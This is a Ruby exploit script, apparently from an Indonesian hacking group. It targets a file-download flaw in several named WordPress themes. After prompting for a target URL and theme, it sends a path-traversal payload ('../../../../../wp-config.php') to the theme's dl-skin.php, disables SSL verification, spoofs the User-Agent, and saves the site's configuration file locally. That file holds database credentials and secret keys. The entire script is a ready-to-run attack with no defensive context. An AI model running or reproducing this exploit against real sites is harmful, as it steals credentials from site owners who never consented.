#!/usr/bin/ruby
require 'curb';
require 'fileutils';
require 'uri';

#create
urlInvalid = false;
themeInvalid = false;
themeCollection = ["awake","construct","dejavu",
					"echelon","elegance","fusion",
						"infocus","megastream","method",
							"modular","myriad","oakrealty","persuasion"];
def valid?(url)
	#url validator
  uri = URI.parse(url)
  uri.kind_of?(URI::HTTP)
rescue URI::InvalidURIError
  false
end

#coloring
def colorize(text, color_code)
  "\e[#{color_code}m#{text}\e[0m"
end
#declare the color
def green(text); colorize(text, 32); end
def red(text); colorize(text, 31); end
def yellow(text); colorize(text, 33); end
def blue(text); colorize(text, 34); end
def purple(text); colorize(text, 35); end
def cyan(text); colorize(text, 36); end

#begin step
puts cyan("//github.com/kampoeng/ruby-AFDFDE") + "    : " + red("ruby-AFDFDE Repository")
puts cyan("//github.com/SurabayaBlackhat/AFDFDE") + " : " + red("Exploit on Github SBH")
puts cyan("//fb.com/freeeaks") + "                    : " + purple("Vico Ervanda");
puts cyan("//fb.com/adiebiazajah") + "                : " + purple("SunDi3yansyah");
puts cyan("//fb.com/100004896060156") + "             : " + purple("CaFc Versace");
puts cyan("//kampoeng.co.id") + "                     : " + green("Kampoeng Network") + "\n\n";
puts green("Theme ID : ");
for i in 0..12
	puts purple(i.to_s) + " : " + yellow(themeCollection[i]);
end
puts "\n";
begin
	#trying to get a valid url
	if urlInvalid == false
		puts green("Tolong masukan url yang valid");
	else
		puts red("url tidak valid");
	end
	urlName = gets.gsub("\n","");
	if(valid?(urlName) === true)
		isUrlValid = 0;
	end;
	urlInvalid=true;
end while isUrlValid != 0;
#url now valid, tell the user
puts yellow("Situs yang vulnerable adalah : ") + cyan(urlName);
begin
	#trying to get theme identifier
	if themeInvalid == false
		puts green("Tolong masukan tema yang digunakan");
		
	else
		puts red("tema tidak valid");
	end
	themeName = gets.gsub("\n","");
	if themeName.scan(/([^0-9]+)/).count == 0 and themeName != ""
		if themeName.to_i < 13 and themeName.to_i > -1
			isThemeValid = 0;
		end
	end
	themeInvalid = true;
end while isThemeValid != 0;
#ok theme is valid, tell the user
puts yellow("Tema yang terpilih adalah : ") + cyan(themeCollection[themeName.to_i]);

#download the content using post method
c = Curl.post( urlName + "/wp-content/themes/"+themeCollection[themeName.to_i] + "/lib/scripts/dl-skin.php",{
						'_mysite_download_skin' => '../../../../../wp-config.php'
						}) do |curl|
		curl.ssl_verify_peer = false
		curl.headers["User-Agent"] = "BlackBerry/3.5.0"
	end
#assign the result
text = c.body_str;

#tell the user, what title we use for write to file
begin 
	puts green("Please specify a file name (a-zA-Z0-9)");
	fileName = gets.gsub("\n","");
	isFileNameValid = fileName.scan(/([^a-zA-Z0-9]+)/).length;
end while isFileNameValid != 0
#title ok tell the user
puts yellow("Judul file yang terpilih adalah : ") + cyan(fileName);

			f = File.open(fileName + ".txt", 'w')
			f.write(text)
			f.close
			puts fileName + ".txt - " + green("Downloaded")
#end step
